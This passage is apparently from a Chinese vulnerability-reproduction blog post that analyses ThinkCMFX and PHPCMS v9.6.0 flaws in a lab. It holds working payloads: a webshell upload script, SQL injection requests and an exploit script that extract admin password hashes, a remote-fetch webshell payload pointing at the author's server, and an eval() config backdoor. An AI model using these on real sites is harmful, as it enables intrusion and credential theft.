然后在`?g=Asset&m=Ueditor&a=upload&action=uploadfile`使用postman或者写一个上传界面抓包修改Cookie都行，上传参数为file，我这里用python上传了
```python
import requests
import os

os.chdir('c:/Users/bmth/Desktop/作业/CTF学习/上传文件/')

url = 'http://192.168.111.133/cms/ThinkCMFX/index.php?g=Asset&m=Ueditor&a=upload&action=uploadfile'

mycookie={ "PHPSESSID":"ijtge7spklk9986prdnp0c6me3" }

session = requests.session()

file = open("bmth.php","rb")
files = {'file': ('bmth.php',file,'image/png'),}

r = session.post(url,files=files,cookies = mycookie)
print(r.text)
```
![](https://img-blog.csdnimg.cn/20210707200656852.png)
访问发现成功上传，没有任何过滤，只验证了用户是否登录
![](https://img-blog.csdnimg.cn/20210707200725105.png)
在`application/Asset/Controller/UeditorController.class.php`中存在一个上传接口，但是在上传前存在一个权限验证，即登录后才可上传
![](https://img-blog.csdnimg.cn/20210707212919562.png)
然后进入到upload方法中，选择uploadfile接口继续跟踪，该接口调用了_ueditor_uplaod()函数
![](https://img-blog.csdnimg.cn/202107072130412.png)
进入到_ueditor_uplaod()函数，漏洞就在这个函数上
![](https://img-blog.csdnimg.cn/20210707215823769.png)
跟进到`application/Common/Common/function.php`的sp_get_upload_setting()函数，发现`$upload_setting`是个二维数组
![](https://img-blog.csdnimg.cn/20210707214514695.png)
>发现程序是通过后缀白名单来进行防御的，明显可以看出程序想用白名单数组，但是使用了`$upload_setting[$filetype]`获得的是一个数组，包含upload_max_filesize和extensions两个key，而explode的作用为把第二个参数通过字符串分割成数组，导致出错，最终返回了一个Null；
故此处少了`['extensions']`，正确写法应该是`$allowed_exts=explode(',', $upload_setting[$filetype]['extensions']);`，此处最终会导致 `$allowed_exts`的值为Null，导致白名单失效

然后就调用`simplewind/Core/Library/Think/Upload.class.php`中的Upload()函数，看到文件上传检测check()
![](https://img-blog.csdnimg.cn/20210707221930434.png)
跟进发现检测文件后缀checkExt()
![](https://img-blog.csdnimg.cn/20210707222116410.png)
从刚才的分析可以知道`$this->config['exts']`为NULL, `empty(NULL)`为true, 所以直接返回true了
![](https://img-blog.csdnimg.cn/20210707222239681.png)
然后进行保存文件，文件路径为
```php
$date=date("Ymd");
'savePath' => "ueditor/$date/"
```
getSaveName方法获取文件名，由于saveExt默认为空，所以不更改文件后缀，文件名用了uniqid()函数，基于以微秒计的当前时间，生成一个唯一的ID
![](https://img-blog.csdnimg.cn/20210707224359240.png)
然后执行save方法保存文件，最后通过json数据返回文件上传的结果
![](https://img-blog.csdnimg.cn/20210707230301172.png)

#### edit_post方法SQL注入
首先登录一个普通用户，然后post传参
```
?g=portal&m=article&a=edit_post

POST:
post[id][0]=bind&post[id][1]=0 | updatexml(1, concat(0x7e,(select database()),0x7e),1)--
post[id][0]=bind&post[id][1]=0 | updatexml(1, concat(0x7e,(select concat(user_login,user_pass) from cmf_users limit 0,1),0x7e),1)--
```
![](https://img-blog.csdnimg.cn/20210708001431413.png)
成功得到admin加密过后的密码，截取一下就可以读全了

这个漏洞就是thinkphp3的sql注入漏洞，分析一下
在`application/Portal/Controller/ArticleController.class.php`处发现前台用户文章编辑提交
![](https://img-blog.csdnimg.cn/20210708110026463.png)
输入的参数通过`I("post.post")`传递到`$article`，跟进一下I函数，在`simplewind/Core/Common/functions.php`，发现通过array_walk_recursive调用think_filter对参数进行过滤
![](https://img-blog.csdnimg.cn/20210708105238912.png)
发现正则字符中没有匹配bind，导致存在了漏洞
![](https://img-blog.csdnimg.cn/20210708105324483.png)
接下来进入`simplewind/Core/Library/Think/Model.class.php`中的save方法，执行到update方法
![](https://img-blog.csdnimg.cn/20210708110135206.png)
随后就到了`simplewind/Core/Library/Think/Db/Driver.class.php`中的update方法
![](https://img-blog.csdnimg.cn/20210709115016884.png)
然后进入到parseSet方法，可以看到传递的参数在进行参数绑定操作，其中时间字符串被赋于占位符0，此处会进行循环操作，将所有的参数进行绑定
![](https://img-blog.csdnimg.cn/20210708110719149.png)
随后进入parseWhere函数，发现会执行 parseWhereItem方法，当`$exp=='bind'`的时候即`$val[0]=='bind'`，会对`$val[1]`进行拼接，仔细看这里会多一个`:`，表示为参数绑定时的占位符
![](https://img-blog.csdnimg.cn/20210708111306234.png)
最后进入到execute()方法，将:0替换为外部传进来的字符串
![](https://img-blog.csdnimg.cn/2021070811173338.png)
最后执行时产生XPATH异常报错，得到我们想要的数据

>由于其他的sql注入都是要登录后台的，就没有复现了

参考：
[Thinkcmf任意漏洞包含漏洞分析复现](https://www.cnblogs.com/0daybug/p/11790619.html)
[ThinkCMF 任意文件包含漏洞分析](https://cloud.tencent.com/developer/article/1532513)
[ThinkCMF X2.2.2多处SQL注入漏洞分析](https://anquan.baidu.com/article/490)
b站视频：[ThinkCMF框架漏洞复现](https://www.bilibili.com/video/av73476588)

## Phpcms

### phpcms_v9.6.0
#### 前台任意文件上传
首先开启web服务，这里是使用的python开启的，`python2 -m SimpleHTTPServer 8000`，然后将我们的一句话木马准备好
![](https://img-blog.csdnimg.cn/20210709224528123.png)
```
?m=member&c=index&a=register&siteid=

POST:
siteid=1&modelid=11&username=12345678&password=12345678&email=12345678@qq.com&info[content]=<img src=http://192.168.111.1:8000/bmth.php#.jpg>&dosubmit=1&protocol=
```



![](https://img-blog.csdnimg.cn/2021070922450333.png)
成功写入木马，访问即可getshell
![](https://img-blog.csdnimg.cn/20210709230006336.png)
poc是发起注册请求，对应的是`phpcms/modules/member/index.php`中的register函数
![](https://img-blog.csdnimg.cn/img_convert/a077a93621d76b43d59ddf187278bc40.png)
很容易发现我们的payload在`$_POST['info']`里，跟进发现将我们的`$_POST['info']`使用`new_html_special_chars`对<>转换为 HTML 实体，然后进入member_input中的get函数
![](https://img-blog.csdnimg.cn/img_convert/35be84fbcd98ee4553169318d03ffbcb.png)
在`caches/caches_model/caches_data/member_input.class.php`内，由于payload为`info[content]`，而v9_model_field表中content的列formtype为editor，所以调用了editor函数
![](https://img-blog.csdnimg.cn/img_convert/f86b074cc518012e32a34d8619afb694.png)
跟进发现执行`$this->attachment->download`函数进行下载
![](https://img-blog.csdnimg.cn/img_convert/e71e77ced767179ea7e46de0531e0ec9.png)
在`phpcms/libs/classes/attachment.class.php`中的download函数存在漏洞
```php
function download($field, $value,$watermark = '0',$ext = 'gif|jpg|jpeg|bmp|png', $absurl = '', $basehref = '')
{
    global $image_d;
    $this->att_db = pc_base::load_model('attachment_model');
    $upload_url = pc_base::load_config('system','upload_url');
    $this->field = $field;
    $dir = date('Y/md/');
    $uploadpath = $upload_url.$dir;
    $uploaddir = $this->upload_root.$dir;
    $string = new_stripslashes($value);
    if(!preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\\2/i", $string, $matches)) return $value;
    $remotefileurls = array();
    foreach($matches[3] as $matche)
    {
        if(strpos($matche, '://') === false) continue;
        dir_create($uploaddir);
        $remotefileurls[$matche] = $this->fillurl($matche, $absurl, $basehref);
    }
    unset($matches, $string);
    $remotefileurls = array_unique($remotefileurls);
    $oldpath = $newpath = array();
    foreach($remotefileurls as $k=>$file) {
        if(strpos($file, '://') === false || strpos($file, $upload_url) !== false) continue;
        $filename = fileext($file);
        $file_name = basename($file);
        $filename = $this->getname($filename);

        $newfile = $uploaddir.$filename;
        $upload_func = $this->upload_func;
        if($upload_func($file, $newfile)) {
            $oldpath[] = $k;
            $GLOBALS['downloadfiles'][] = $newpath[] = $uploadpath.$filename;
            @chmod($newfile, 0777);
            $fileext = fileext($filename);
            if($watermark){
                watermark($newfile, $newfile,$this->siteid);
            }
            $filepath = $dir.$filename;
            $downloadedfile = array('filename'=>$filename, 'filepath'=>$filepath, 'filesize'=>filesize($newfile), 'fileext'=>$fileext);
            $aid = $this->add($downloadedfile);
            $this->downloadedfiles[$aid] = $filepath;
        }
    }
    return str_replace($oldpath, $newpath, $value);
}
```
首先使用new_stripslashes函数删除反斜杠，然后进行正则匹配
```php
if(!preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\\2/i",$string, $matches)) return $value;
```
这里正则要求输入满足`src/href=url.(gif|jpg|jpeg|bmp|png)`，这就是为什么后面要加.jpg的原因，然后进入fillurl函数进行处理
![](https://img-blog.csdnimg.cn/img_convert/4073d40e28d65f5d9f63a16ee103d869.png)
发现会在`#`那里进行截取，那么就可以使用`#.jpg`绕过，那么url变为了`http://192.168.111.1:8000/bmth.php`
![](https://img-blog.csdnimg.cn/img_convert/f8f6c27454a54196e58dea65ea6aa7c9.png)
最后调用了copy函数，对远程的文件进行下载
![](https://img-blog.csdnimg.cn/img_convert/234aabd357a7aa466d86cfe1b01b6210.png)
程序在下载之后回到了register函数中，可以看到当`$status > 0`时会执行insert操作
![](https://img-blog.csdnimg.cn/img_convert/bc6bb9b2a417ceb65eb8842cbb9d049a.png)
也就是向v9_member_detail表中的content和userid两列插入数据
![](https://img-blog.csdnimg.cn/img_convert/2d030a8321e16a0a6cba3c4af877bc6d.png)
因为表中并没有content列，所以产生报错，从而将插入数据中的 shell 路径返回给了我们

#### wap模块sql注入
首先访问`?m=wap&c=index&a=init&siteid=1`，获得到cookie
![](https://img-blog.csdnimg.cn/2021071021241668.png)
然后将这个cookie值作为userid_flash的值
```
?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id%3D%25%2A27%20and%20updatexml%281%2Cconcat%280x7e%2C%28select%20database%28%29%29%2C0x7e%29%2C1%29%2523%26modelid%3D1%26catid%3D1%26m%3D1%26f%3D

POST:
userid_flash=e65cAX34kIXJjOovCDECkhcccMtYIMrPvFZF5Rz7
```
![](https://img-blog.csdnimg.cn/20210710212739781.png)
得到GiZXP_att_json的值，最后作为a_k的payload传入
```
?m=content&c=down&a_k=1b27_hA6AVlZyO4qgZ9baSS_PyClX3sQA6HkInEKASUFIejSOnWnsBWk11Ads8-QtyXsrJJEBoQ2wyvLStyLUmSivjIXUzbpkggk02ywnNlTJwriwUszSuJ7RbLWUEXGS3ZtLOmEMQZV1qiSAdsrWbzdaRO7qSaQsp9qh59JY5AByTNWpWvwY9FSl9Gil0t4PHGRMMYrxZ5M
```
![](https://img-blog.csdnimg.cn/20210710212913585.png)
在网上找了一个exp：
```python
import requests
import re
from urllib.parse import quote
 
TIMEOUT = 3
 
def poc(url):
 
    #payload = "&id=%*27 and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23&modelid=1&catid=1&m=1&f="
    payload = "&id=%*27 and updatexml(1,concat(0x7e,(select concat(username,password) from v9_admin limit 0,1),0x7e),1)%23&modelid=1&catid=1&m=1&f="

    cookies = {}
    step1 = '{}/index.php?m=wap&a=index&siteid=1'.format(url)
    for c in requests.get(step1, timeout=TIMEOUT).cookies:
        if c.name[-7:] == '_siteid':
            cookie_head = c.name[:6]
            cookies[cookie_head + '_userid'] = c.value
            cookies[c.name] = c.value
            break
    else:
        return False
 
    step2 = "{}/index.php?m=attachment&c=attachments&a=swfupload_json&src={}".format(url, quote(payload))
    for c in requests.get(step2, cookies=cookies, timeout=TIMEOUT).cookies:
        if c.name[-9:] == '_att_json':
            enc_payload = c.value
            break
    else:
        return False
 
    setp3 = url + '/index.php?m=content&c=down&a_k=' + enc_payload
    r = requests.get(setp3, cookies=cookies, timeout=TIMEOUT)
    result = re.findall(r"</b>XPATH syntax error: '(.*?)' <br />",str(r.text), re.S)[0]
    
    print(result)

poc('http://192.168.111.133/cms/phpcms_v9.6.0')
```
![](https://img-blog.csdnimg.cn/20210710140145440.png)
漏洞在`phpcms/modules/content/down.php`的init函数
![](https://img-blog.csdnimg.cn/img_convert/d57d285f930574e46b59948a8415bea9.png)
可以看到通过GET传参`a_k`参数的值，然后调用`sys_auth`方法，其中auth_key是通过load_config读取system配置，对应的是位于 `caches\configs\system.php`文件中密钥
![](https://img-blog.csdnimg.cn/img_convert/0c223320e0f8b4c881d5948868bf23de.png)
调用parse_str函数去变量解析， parse_str函数至少存在三个问题:
1. 带入未初始化的数据
2. 可以进行url编码
3. 变量覆盖漏洞

>phpcms 这个sqli注入漏洞就利用了parse_str函数的前两个漏洞，首先`$id`未初始化，可以通过parse_str函数带入，相当于可控参数，其次parse_str函数可以将%27转换为单引号

最后调用get_one函数执行sql语句，那么需要auth_key可控
```php
$a_k = sys_auth($a_k, 'DECODE', pc_base::load_config('system','auth_key'));
```
是一个解密操作，所以要求传入的`$a_k`变量的值是加密后的结果，而每个站点这个 auth_key 可能都是不一样的，所以本地加密生成 payload 就不现实了，那么我们就需要找到一个可以传参加密并且可以看到加密后的值的点
在`phpcms/libs/classes/param.class.php`中的set_cookie 方法发现调用了 sys_auth 做 ENCODE 操作，并且值是存放在cookie中的，可以直接获取
![](https://img-blog.csdnimg.cn/img_convert/65fecc5fd9f72fba5e40881ce8892318.png)
搜索一下`param::set_cookie`, 在attachment 模块部分发现一个显而易见的操控点，在`phpcms/modules/attachment/attachments.php`中，通过GET传参 src 的参数，首先会经过safe_replace方法的过滤，然后写入到数组arr中，进而做json_encode的操作，最终再调用 set_cookie 方法，写入到cookie中
![](https://img-blog.csdnimg.cn/img_convert/436fc8b633b842c282ae95e208fe8ede.png)
查看一下过滤函数，在`phpcms/libs/functions/global.func.php`
![](https://img-blog.csdnimg.cn/img_convert/fa78d5801c509c773b6489bf7e69ef6c.png)
发现只是简单的置为空，那么传入`%*27`，就可以绕过前面`%27`的替换删除，然后将`*`替换删除后，`%*27`就会变为`%27`
不过在执行swfupload_json需要一点条件， attachement.php的控制器文件的构造函数如下
```php
function __construct() {
	pc_base::load_app_func('global');
	$this->upload_url = pc_base::load_config('system','upload_url');
	$this->upload_path = pc_base::load_config('system','upload_path');		
	$this->imgext = array('jpg','gif','png','bmp','jpeg');
	$this->userid = $_SESSION['userid'] ? $_SESSION['userid'] : (param::get_cookie('_userid') ? param::get_cookie('_userid') : sys_auth($_POST['userid_flash'],'DECODE'));
	$this->isadmin = $this->admin_username = $_SESSION['roleid'] ? 1 : 0;
	$this->groupid = param::get_cookie('_groupid') ? param::get_cookie('_groupid') : 8;
	//判断是否登录
	if(empty($this->userid)){
		showmessage(L('please_login','','member'));
	}
}
```
调用`param::get-cookie`从cookie里面获取userid加密值，如果解密后不为空， 就判断已经登录；否则就跳转到登录界面，那么 swfupload_json 就无法被调用，只需要找一个可能得到加密值的地方就行
在`/phpcms/modules/wap/index.php`
![](https://img-blog.csdnimg.cn/img_convert/3397f1addb7c37e34bf00f67eb641652.png)
这里调用了set_cookie，可得到一个合法的siteid加密值，把这个siteid替换成userid即可绕过attachement.php中的登录限制，构造链完成


#### 后台getshell
首先登录后台，然后进入phpsso后台的系统设置界面，点击UCenter配置
![](https://img-blog.csdnimg.cn/img_convert/24f252a50f896932402560c6224b764a.png)
我们可以构造：
```
name="data[uc_api','11');/*]"
```
并在Ucenter api 地址输入：`*/eval($_REQUEST[test]);//`
然后提交，点击更新缓存
![](https://img-blog.csdnimg.cn/img_convert/82834d4274d26d3acfb4aba10e129c3f.png)
访问`/phpsso_server/caches/configs/uc_config.php?test=phpinfo();`，发现成功写入webshell
![](https://img-blog.csdnimg.cn/img_convert/a9398fa177b48dc2fef634837581786d.png)
漏洞在`phpsso_server/phpcms/modules/admin/system.php`
![](https://img-blog.csdnimg.cn/img_convert/ced5de05ea849f9b7887f40af64cb6a5.png)
这里接受data传来的name和value的值，并且写入到配置文件`/phpsso_server/caches/configs/uc_config.php`中
这里使用`/*`和`*/`闭合掉拼接的单引号，然后使用`//`注释掉最后的括号，那么中间就可以插入我们的payload了，最后成功写入


![](https://img-blog.csdnimg.cn/img_convert/7b4e696e978937f405491339e18181fd.png)
参考：[论如何优雅地拿下PHPCMS](https://www.freebuf.com/column/180754.html)
[PHPCMS v9.6.0 wap模块 SQL注入](https://www.cnblogs.com/yangxiaodi/p/6869594.html)
[PHPCMS v9.6.0 任意文件上传漏洞分析](https://paper.seebug.org/273/)
[PHPCMS漏洞分析合集(上)](https://xz.aliyun.com/t/5730)
[https://github.com/jiangsir404/PHP-code-audit/blob/master/phpcms/phpcmsv9.6.0-sqli.md](https://github.com/jiangsir404/PHP-code-audit/blob/master/phpcms/phpcmsv9.6.0-sqli.md)
